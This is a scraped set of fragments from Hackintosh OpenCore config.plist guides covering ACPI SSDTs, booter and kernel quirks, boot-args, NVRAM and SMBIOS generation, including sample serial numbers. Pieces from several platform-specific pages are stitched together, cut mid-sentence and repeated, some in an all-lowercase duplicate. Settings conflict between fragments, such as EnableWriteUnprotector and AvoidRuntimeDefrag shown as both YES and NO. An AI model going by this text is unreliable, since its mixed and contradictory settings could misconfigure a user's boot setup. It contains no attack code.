DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we leave it as default\n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register.\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation. However the necessity of this quirk is determined by OCABC: Only N/256 slide values are usable! message in the debug log. If the message OCABC: All slides are usable! You can disable ProvideCustomSlide! is present in your log, you can disable ProvideCustomSlide.\n * SetupVirtualMap: YES\n   * Fixes SetVirtualAddresses calls to virtual addresses, required for Gigabyte boards to resolve early kernel panics\n\n\n# DeviceProperties\n\n\n\n\n# Add\n\nSets device properties from a map.\n\nBy default, the Sample.plist has this section set for audio which we'll be setting up by setting the layout ID in the boot-args section, so removal of PciRoot(0x0)/Pci(0x1b,0x0) is also recommended from the Add section.\n\nPciRoot(0x0)/Pci(0x1,0x1)/Pci(0x0,0x0)\n\nThis entry relates to Intel's I350 controller found on many Intel and Supermicro server boards, and some Intel Server PCIe adapters. What we'll be doing here is tricking Apple's I210 driver into supporting our I350 network controller:\n\nKEY         TYPE   VALUE\ndevice-id   Data   33150000\n\n * Note: If your board doesn't have an onboard I350 NIC, there's no reason to add this entry.\n * Note 2: If you get a kernel panic on the AppleIntelI210Ethernet kext, or not all of the adapters are showing up, you may need to edit or add additional PciRoot properties for each adapter.\n\n\n# Delete\n\nRemoves device properties from the map, for us we can ignore this\n\n\n# Kernel\n\n\n\n\n# Add\n\nHere's where we specify which kexts to load, in what specific order to load, and what architectures each kext is meant for. By default we recommend leaving what ProperTree has done, however for 32-bit CPUs please see below:\n\nMore in-depth Info\n\nThe main thing you need to keep in mind is:\n\n * Load order\n   * Remember that any plugins should load after its dependencies\n   * This means kexts like Lilu must come before VirtualSMC, AppleALC, WhateverGreen, etc\n\nA reminder that ProperTree users can run Cmd/Ctrl + Shift + R to add all their kexts in the correct order without manually typing each kext out.\n\n * Arch\n   * Architectures supported by this kext\n   * Currently supported values are Any, i386 (32-bit), and x86_64 (64-bit)\n * BundlePath\n   * Name of the kext\n   * ex: Lilu.kext\n * Enabled\n   * Self-explanatory, either enables or disables the kext\n * ExecutablePath\n   * Path to the actual executable is hidden within the kext, you can see what path your kext has by right-clicking and selecting Show Package Contents. Generally, they'll be Contents/MacOS/Kext but some have kexts hidden within under Plugin folder. Do note that plist only kexts do not need this filled in.\n   * ex: Contents/MacOS/Lilu\n * MinKernel\n   * Lowest kernel version your kext will be injected into, see below table for possible values\n   * ex. 12.00.00 for OS X 10.8\n * MaxKernel\n   * Highest kernel version your kext will be injected into, see below table for possible values\n   * ex. 11.99.99 for OS X 10.7\n * PlistPath\n   * Path to the info.plist hidden within the kext\n   * ex: Contents/Info.plist\n\nKernel Support Table\n\nOS X VERSION   MINKERNEL   MAXKERNEL\n10.4           8.0.0       8.99.99\n10.5           9.0.0       9.99.99\n10.6           10.0.0      10.99.99\n10.7           11.0.0      11.99.99\n10.8           12.0.0      12.99.99\n10.9           13.0.0      13.99.99\n10.10          14.0.0      14.99.99\n10.11          15.0.0      15.99.99\n10.12          16.0.0      16.99.99\n10.13          17.0.0      17.99.99\n10.14          18.0.0      18.99.99\n10.15          19.0.0      19.99.99\n11             20.0.0      20.99.99\n12             21.0.0      21.99.99\n13             22.0.0      22.99.99\n\n\n# Emulate\n\nNeeded for spoofing unsupported CPUs, thankfully Sandy and Ivy bridge E are officially supported so no patching necessary.\n\n\n# Force\n\nUsed for loading kexts off system volume, only relevant for older operating systems where certain kexts are not present in the cache(ie.

Required for Broadwell-E and lower\n * CustomSMBIOSGuid: NO\n   * Performs GUID patching for UpdateSMBIOSMode set to Custom. Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * IncreasePciBarSize: NO\n   * Increases 32-bit PCI bar size in IOPCIFamily from 1 to 4 GB, enabling Above4GDecoding in the BIOS is a much cleaner and safer approach. Some X99 boards may require this, you'll generally experience a kernel panic on IOPCIFamily if you need this. Note this shouldn't be needed on Mojave and newer\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker. Hiding auxiliary entries may increase boot performance on multi-disk systems. You can press space at the picker to show these entries\n\n\n# Debug\n\nInfo\n\nHelpful for debugging OpenCore boot issues(We'll be changing everything but DisplayDelay):\n\nQUIRK             ENABLED\nAppleDebug        YES\nApplePanic        YES\nDisableWatchDog   YES\nTarget            67\n\nMore in-depth Info\n * AppleDebug: YES\n   * Enables boot.efi logging, useful for debugging. Note this is only supported on 10.15.4 and newer\n * ApplePanic: YES\n   * Attempts to log kernel panics to disk\n * DisableWatchDog: YES\n   * Disables the UEFI watchdog, can help with early boot issues\n * DisplayLevel: 2147483650\n   * Shows even more debug information, requires debug version of OpenCore\n * SysReport: NO\n   * Helpful for debugging such as dumping ACPI tables\n   * Note that this is limited to DEBUG versions of OpenCore\n * Target: 67\n   * Shows more debug information, requires debug version of OpenCore\n\nThese values are based of those calculated in OpenCore debugging\n\n\n# Security\n\nInfo\n\nSecurity is pretty self-explanatory, do not skip.

Can be considered a security risk so optional\n\n * BlacklistAppleUpdate: YES\n   \n   * Used for blocking firmware updates, used as extra level of protection as macOS Big Sur no longer uses run-efi-updater variable\n\n * DmgLoading: Signed\n   \n   * Ensures only signed DMGs load\n\n * ExposeSensitiveData: 6\n   \n   * Shows more debug information, requires debug version of OpenCore\n\n * Vault: Optional\n   \n   * We won't be dealing vaulting so we can ignore, you won't boot with this set to Secure\n   * This is a word, it is not optional to omit this setting. You will regret it if you don't set it to Optional, note that it is case-sensitive\n\n * ScanPolicy: 0\n   \n   * 0 allows you to see all drives available, please refer to Security section for further details. Will not boot USB devices with this set to default\n\n * SecureBootModel: Default\n   \n   * Controls Apple's secure boot functionality in macOS, please refer to Security section for further details.\n   * Note: Users may find upgrading OpenCore on an already installed system can result in early boot failures.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nInfo\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.

opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will

remove the entry for it in your config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n# delete\n\nthis blocks certain acpi tables from loading, for us we can ignore this.\n\n\n# patch\n\nthis section allows us to dynamically modify parts of the acpi (dsdt, ssdt, etc.) via opencore. for us, our patches

patching for updatesmbiosmode set to custom. usually relevant for dell laptops\n   * enabling this quirk with updatesmbiosmode custom mode can also disable smbios injection into \"non-apple\" oses however we do not endorse this method as it breaks bootcamp compatibility. use at your own risk\n * disableiomapper: yes\n   * needed to get around vt-d if either unable to disable in bios or needed for other operating systems, much better alternative to dart=0 as sip can stay on in catalina\n * disablelinkeditjettison: yes\n   * allows lilu and others to have more reliable performance without keepsyms=1\n * disablertcchecksum: no\n   * prevents applertc from writing to primary checksum (0x58-0x59), required for users who either receive bios reset or are sent into safe mode after

iopcifamily from 1 to 4 gb, enabling above4gdecoding in the bios is a much cleaner and safer approach. some x99 boards may require this, you'll generally experience a kernel panic on iopcifamily if you need this. note this shouldn't be needed on mojave and newer\n * lapickernelpanic: no\n   * disables kernel panic on ap core lapic interrupt, generally needed for hp systems. clover equivalent is kernel lapic\n * legacycommpage: no\n   * resolves ssse3 requirement for 64 bit cpus in macos, mainly relevant for 64-bit pentium 4 cpus(ie. prescott)\n * panicnokextdump: yes\n   * allows for reading

this is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing usb. please create a usb map when possible.\n   * with macos 11.3+, xhciportlimit may not function as intended. we recommend users either disable this quirk and map before upgrading or map from windows. you may also install macos 11.2.3 or older.\n\nthe reason being is that usbinjectall reimplements builtin macos functionality without proper current tuning. it is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n#

auto and let macos decide based on your smbios. see below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit cpus must use this(or cpus missing ssse3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * kernelcache: auto\n   \n   * set kernel cache type, mainly useful for debugging and so we recommend auto for best support\n\n\n# misc\n\n\n\n\n#

instead of the apple logo and progress bar. it's invaluable\n              to any hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   this disables macos's watchdog which helps prevents a reboot\n              on a kernel panic. that way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    this is a companion setting to debug=0x100 that tells the os\n              to also print the symbols on a kernel panic. that can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       used for setting layout-id for applealc, see supported\n              codecs to figure out which layout to use for your specific\n              system. more info on this is covered in the post-install\n              page\n\n * gpu-specific boot-args:\n\nboot-args        description\nagdpmod=pikera   used for disabling board id checks on some navi gpus (rx\n                 5000 & 6000 series), without this you'll get a black screen.\n                 don't use if you don't have navi (ie. polaris and vega cards\n                 shouldn't use this)\n-radcodec        used for allowing officially unsupported amd gpus (spoofed)\n                 to use the

default is set to 00000000 which enables system integrity protection. you can choose a number of different values but overall we recommend keeping this enabled for best security practices. more info can be found in our troubleshooting page: disabling sip\n\n * run-efi-updater: no\n   \n   * this is used to prevent apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * needed for non-latin keyboards in the format of lang-country:keyboard, recommended to keep blank though you can specify it(default in sample config is russian):\n   * american: en-us:0(656e2d55533a30 in hex)\n   * full list can be found in applekeyboardlayouts.txt\n   * hint: prev-lang:kbd can be changed into a string so you can input en-us:0 directly instead of converting to hex\n   * hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the language picker to appear

It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS   DESCRIPTION\nSSDT-EC          Fixes the embedded controller, see Getting Started With ACPI\n                 Guide for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\nLEGACY   UEFI\n         \n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing spaces to be passthrough to macOS that are generally ignored, useful when paired with DevirtualiseMmio\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, depending where your board has UEFI, you have 2 options depending what your motherboard supports:\n\n# Legacy Settings\n\nQUIRK                    ENABLED   COMMENT\nAvoidRuntimeDefrag       No        Big Sur may require this quirk enabled\nEnableSafeModeSlide      No        \nEnableWriteUnprotector   No        \nProvideCustomSlide       No        \nRebuildAppleMemoryMap    Yes       This is required to boot OS X 10.4 through 10.6\nSetupVirtualMap          No        \n\n# UEFI Settings\n\nQUIRK                   ENABLED   COMMENT\nRebuildAppleMemoryMap   Yes       This is required to boot OS X 10.4 through 10.6\n\nMore in-depth Info\n * AvoidRuntimeDefrag: NO\n   * Fixes UEFI runtime services like date, time, NVRAM, power control on UEFI Boards\n   * macOS Big Sur however requires the APIC table present, otherwise causing early kernel panics so this quirk is recommended for those users.\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: YES\n   * Needed to remove write protection from CR0 register on UEFI platforms\n * ProvideCustomSlide: YES\n   * Used for Slide variable calculation.

Required for Broadwell-E and lower\n * CustomSMBIOSGuid: NO\n   * Performs GUID patching for UpdateSMBIOSMode set to Custom. Usually relevant for Dell laptops\n   * Enabling this quirk with UpdateSMBIOSMode Custom mode can also disable SMBIOS injection into \"non-Apple\" OSes however we do not endorse this method as it breaks Bootcamp compatibility. Use at your own risk\n * DisableIoMapper: YES\n   * Needed to get around VT-D if either unable to disable in BIOS or needed for other operating systems, much better alternative to dart=0 as SIP can stay on in Catalina\n * DisableLinkeditJettison: YES\n   * Allows Lilu and others to have more reliable performance without keepsyms=1\n * DisableRtcChecksum: NO\n   * Prevents AppleRTC from writing to primary checksum (0x58-0x59), required for users who either receive BIOS reset or are sent into Safe mode after reboot/shutdown\n * ExtendBTFeatureFlags NO\n   * Helpful for those having continuity issues with non-Apple/non-Fenvi cards\n * IncreasePciBarSize: NO\n   * Increases 32-bit PCI bar size in IOPCIFamily from 1 to 4 GB, enabling Above4GDecoding in the BIOS is a much cleaner and safer approach. Some X99 boards may require this, you'll generally experience a kernel panic on IOPCIFamily if you need this. Note this shouldn't be needed on Mojave and newer\n * LapicKernelPanic: NO\n   * Disables kernel panic on AP core lapic interrupt, generally needed for HP systems. Clover equivalent is Kernel LAPIC\n * LegacyCommpage: NO\n   * Resolves SSSE3 requirement for 64 Bit CPUs in macOS, mainly relevant for 64-Bit Pentium 4 CPUs(ie. Prescott)\n * PanicNoKextDump: YES\n   * Allows for reading kernel panics logs when kernel panics occur\n * PowerTimeoutKernelPanic: YES\n   * Helps fix kernel panics relating to power changes with Apple drivers in macOS Catalina, most notably with digital audio.\n * SetApfsTrimTimeout: -1\n   * Sets trim timeout in microseconds for APFS filesystems on SSDs, only applicable for macOS 10.14 and newer with problematic SSDs.\n * XhciPortLimit: YES\n   * This is actually the 15 port limit patch, don't rely on it as it's not a guaranteed solution for fixing USB. Please create a USB map when possible.\n   * With macOS 11.3+, XhciPortLimit may not function as intended. We recommend users either disable this quirk and map before upgrading or map from Windows. You may also install macOS 11.2.3 or older.\n\nThe reason being is that UsbInjectAll reimplements builtin macOS functionality without proper current tuning. It is much cleaner to just describe your ports in a single plist-only kext, which will not waste runtime memory and such\n\n\n# Scheme\n\nSettings related to legacy booting(ie. 10.4-10.6), for majority you can skip however for those planning to boot legacy OSes you can see below:\n\nMore in-depth Info\n\n * FuzzyMatch: True\n   \n   * Used for ignoring checksums with kernelcache, instead opting for the latest cache available. Can help improve boot performance on many machines in 10.6\n\n * KernelArch: x86_64\n   \n   * Set the kernel's arch type, you can choose between Auto, i386 (32-bit), and x86_64 (64-bit).\n   * If you're booting older OSes which require a 32-bit kernel(ie. 10.4 and 10.5) we recommend to set this to Auto and let macOS decide based on your SMBIOS. See below table for supported values:\n     * 10.4-10.5 — x86_64, i386 or i386-user32\n       * i386-user32 refers 32-bit userspace, so 32-bit CPUs must use this(or CPUs missing SSSE3)\n       * x86_64 will still have a 32-bit kernelspace however will ensure 64-bit userspace in 10.4/5\n     * 10.6 — i386, i386-user32, or x86_64\n     * 10.7 — i386 or x86_64\n     * 10.8 or newer — x86_64\n\n * KernelCache: Auto\n   \n   * Set kernel cache type, mainly useful for debugging and so we recommend Auto for best support\n\n\n# Misc\n\n\n\n\n# Boot\n\nInfo\n\nQUIRK           ENABLED   COMMENT\nHideAuxiliary   YES       Press space to show macOS recovery and other auxiliary\n                          entries\n\nMore in-depth Info\n * HideAuxiliary: YES\n   * This option will hide supplementary entries, such as macOS recovery and tools, in the picker. Hiding auxiliary entries may increase boot performance on multi-disk systems. You can press space at the picker to show these entries\n\n\n# Debug\n\nInfo\n\nHelpful for debugging OpenCore boot issues(We'll be changing everything but DisplayDelay):\n\nQUIRK             ENABLED\nAppleDebug        YES\nApplePanic        YES\nDisableWatchDog   YES\nTarget            67\n\nMore in-depth Info\n * AppleDebug: YES\n   * Enables boot.efi logging, useful for debugging.

It's invaluable\n              to any Hackintosher, as it gives you an inside look at the\n              boot process, and can help you identify issues, problem\n              kexts, etc.\ndebug=0x100   This disables macOS's watchdog which helps prevents a reboot\n              on a kernel panic. That way you can hopefully glean some\n              useful info and follow the breadcrumbs to get past the\n              issues.\nkeepsyms=1    This is a companion setting to debug=0x100 that tells the OS\n              to also print the symbols on a kernel panic. That can give\n              some more helpful insight as to what's causing the panic\n              itself.\nalcid=1       Used for setting layout-id for AppleALC, see supported\n              codecs to figure out which layout to use for your specific\n              system.

It is generally recommended to change this with csrutil via the recovery partition.\n   * csr-active-config by default is set to 00000000 which enables System Integrity Protection. You can choose a number of different values but overall we recommend keeping this enabled for best security practices. More info can be found in our troubleshooting page: Disabling SIP\n\n * run-efi-updater: No\n   \n   * This is used to prevent Apple's firmware update packages from installing and breaking boot order; this is important as these firmware updates (meant for Macs) will not work.\n\n * prev-lang:kbd: <>\n   \n   * Needed for non-latin keyboards in the format of lang-COUNTRY:keyboard, recommended to keep blank though you can specify it(Default in Sample config is Russian):\n   * American: en-US:0(656e2d55533a30 in HEX)\n   * Full list can be found in AppleKeyboardLayouts.txt\n   * Hint: prev-lang:kbd can be changed into a String so you can input en-US:0 directly instead of converting to HEX\n   * Hint 2: prev-lang:kbd can be set to a blank variable (eg. <>) which will force the Language Picker to appear instead at first boot up.\n\nKEY             TYPE     VALUE\nprev-lang:kbd   String   en-US:0\n\n\n# Delete\n\nInfo\n\nForcibly rewrites NVRAM variables, do note that Add will not overwrite values already present in NVRAM so values like boot-args should be left alone.

This will give us an output similar to the following:\n\n  #######################################################\n #               MacPro5,1 SMBIOS Info                 #\n#######################################################\n\nType:         MacPro5,1\nSerial:       C02YX0TZHX87\nBoard Serial: C029269024NJG36CB\nSmUUID:       DEA17B2D-2F9F-4955-B266-A74C47678AD3\n\n\nThe Type part gets copied to Generic -> SystemProductName.\n\nThe Serial part gets copied to Generic -> SystemSerialNumber.\n\nThe Board Serial part gets copied to Generic -> MLB.\n\nThe SmUUID part gets copied to Generic -> SystemUUID.\n\nWe set Generic -> ROM to either an Apple ROM (dumped from a real Mac), your NIC MAC address, or any random MAC address (could be just 6 random bytes, for this guide we'll use 11223300 0000. After install follow the Fixing iServices page on how to find your real MAC Address)\n\nReminder that you need an invalid serial! When inputting your serial number in Apple's Check Coverage Page, you should get a message such as \"Unable to check coverage for this serial number.\"\n\nAutomatic: YES\n\n * Generates PlatformInfo based on Generic section instead of DataHub, NVRAM, and SMBIOS sections\n\n\n# Generic\n\nMore in-depth Info\n\n * AdviseFeatures: NO\n   \n   * Used for when the EFI partition isn't first on the Windows drive\n\n * MaxBIOSVersion: NO\n   \n   * Sets BIOS version to Max to avoid firmware updates in Big Sur+, mainly applicable for genuine Macs.\n\n * ProcessorType: 0\n   \n   * Set to 0 for automatic type detection, however this value can be overridden if desired.

Use at your own risk\n\n\n# UEFI\n\n\n\nConnectDrivers: YES\n\n * Forces .efi drivers, change to NO will automatically connect added UEFI drivers. This can make booting slightly faster, but not all drivers connect themselves.

tell you how to configure everything, you won't be left in the cold. this also means if you have issues, review your config settings to make sure they're correct. main things to note with opencore:\n\n * all properties must be defined, there are no default opencore will fall back on so do not delete sections unless told explicitly so. if the guide doesn't mention the option, leave it at default.\n * the sample.plist cannot be used as-is, you must configure it to your system\n * do not use configurators, these rarely respect opencore's configuration and even some like mackie's will add clover properties and corrupt plists!\n\nnow with all that, a quick reminder of the tools we need\n\n * propertree\n   * universal plist editor\n * gensmbios\n   * for generating our smbios data\n * sample/config.plist\n   * see previous section on how to obtain: config.plist setup\n\nwarning\n\nread this guide more than once before setting up opencore and make sure you have it set up

so if present, remove the entry for it in your config.plist and under efi/oc/acpi.\n\nfor those wanting a deeper dive into dumping your dsdt, how to make these ssdts, and compiling them, please see the getting started with acpi page. compiled ssdts have a .aml extension(assembled) and will go into the efi/oc/acpi folder and must be specified in your config under acpi -> add as well.\n\n\n#

however we do not endorse this method as it breaks bootcamp compatibility. use at your own risk\n * disableiomapper: yes\n   * needed to get around vt-d if either unable to disable in bios or needed

config.plist may seem hard, it's not. It just takes some time but this guide will tell you how to configure everything, you won't be left in the cold. This also means if you have issues, review your config settings to make sure they're correct. Main things to note with OpenCore:\n\n * All properties must be defined, there are no default OpenCore will fall back on so do not delete sections unless told explicitly so. If the guide doesn't mention the option, leave it at default.\n * The Sample.plist cannot be used As-Is, you must configure it to your system\n * DO NOT USE CONFIGURATORS, these rarely respect OpenCore's configuration and even some like Mackie's will add Clover properties and corrupt plists!\n\nNow with all that, a quick reminder of the tools we need\n\n * ProperTree\n   * Universal plist editor\n * GenSMBIOS\n   * For generating our SMBIOS data\n * Sample/config.plist\n   * See previous section on how to obtain: config.plist Setup\n\nWARNING\n\nRead this guide more than once before setting up OpenCore and make sure you have it set up correctly. Do note that images will not always be the most up-to-date so please read the text below them, if nothing's mentioned then leave as default.\n\n\n# ACPI\n\n\n\n\n# Add\n\nInfo\n\nThis is where you'll add SSDTs for your system, these are very important to booting macOS and have many uses like USB maps, disabling unsupported GPUs and such. And with our system, it's even required to boot. Guide on making them found here: Getting started with ACPI\n\nFor us we'll need a couple of SSDTs to bring back functionality that Clover provided:\n\nREQUIRED SSDTS    DESCRIPTION\nSSDT-PLUG         Allows for native CPU power management on Haswell and newer,\n                  see Getting Started With ACPI Guide for more details.\nSSDT-EC-USBX      Fixes both the embedded controller and USB power, see\n                  Getting Started With ACPI Guide for more details.\nSSDT-RTC0-RANGE   Required for enabling the legacy RTC clock in macOS, this is\n                  also required for all Big Sur users to ensure their RTC\n                  device is compatible. See Getting Started With ACPI Guide\n                  for more details.\n\nNote that you should not add your generated DSDT.aml here, it is already in your firmware. So if present, remove the entry for it in your config.plist and under EFI/OC/ACPI.\n\nFor those wanting a deeper dive into dumping your DSDT, how to make these SSDTs, and compiling them, please see the Getting started with ACPI page. Compiled SSDTs have a .aml extension(Assembled) and will go into the EFI/OC/ACPI folder and must be specified in your config under ACPI -> Add as well.\n\n\n# Delete\n\nThis blocks certain ACPI tables from loading, for us we can ignore this.\n\n\n# Patch\n\nThis section allows us to dynamically modify parts of the ACPI (DSDT, SSDT, etc.) via OpenCore. For us, our patches are handled by our SSDTs. This is a much cleaner solution as this will allow us to boot Windows and other OSes with OpenCore\n\n\n# Quirks\n\nSettings relating to ACPI, leave everything here as default as we have no use for these quirks.\n\n\n# Booter\n\n\n\nThis section is dedicated to quirks relating to boot.efi patching with OpenRuntime, the replacement for AptioMemoryFix.efi\n\n\n# MmioWhitelist\n\nThis section is allowing devices to be passthrough to macOS that are generally ignored, for us we can ignore this section.\n\n\n# Quirks\n\nInfo\n\nSettings relating to boot.efi patching and firmware fixes, for us, we need to change the following:\n\nQUIRK                    ENABLED   COMMENT\nDevirtualiseMmio         YES       \nEnableWriteUnprotector   NO        \nRebuildAppleMemoryMap    YES       \nSetupVirtualMap          YES       Note newer Asus BIOS(v3006+) will not boot with this quirk\n                                   enabled\nSyncRuntimePermissions   YES       \n\nMore in-depth Info\n * AvoidRuntimeDefrag: YES\n   * Fixes UEFI runtime services like date, time, NVRAM, power control, etc\n * DevirtualiseMmio: YES\n   * Reduces Stolen Memory Footprint, expands options for slide=N values and very helpful with fixing Memory Allocation issues on Z390. Requires ProtectUefiServices as well on IceLake and Z390 Coffee Lake\n * EnableSafeModeSlide: YES\n   * Enables slide variables to be used in safe mode.\n * EnableWriteUnprotector: NO\n   * This quirk and RebuildAppleMemoryMap can commonly conflict, recommended to enable the latter on newer platforms and disable this entry.\n   * However, due to issues with OEMs not using the latest EDKII builds you may find that the above combo will result in early boot failures. This is due to missing the MEMORY_ATTRIBUTE_TABLE and such we recommend disabling RebuildAppleMemoryMap and enabling EnableWriteUnprotector. More info on this is covered in the troubleshooting section\n * ProvideCustomSlide: YES\n   * Used for Slide variable 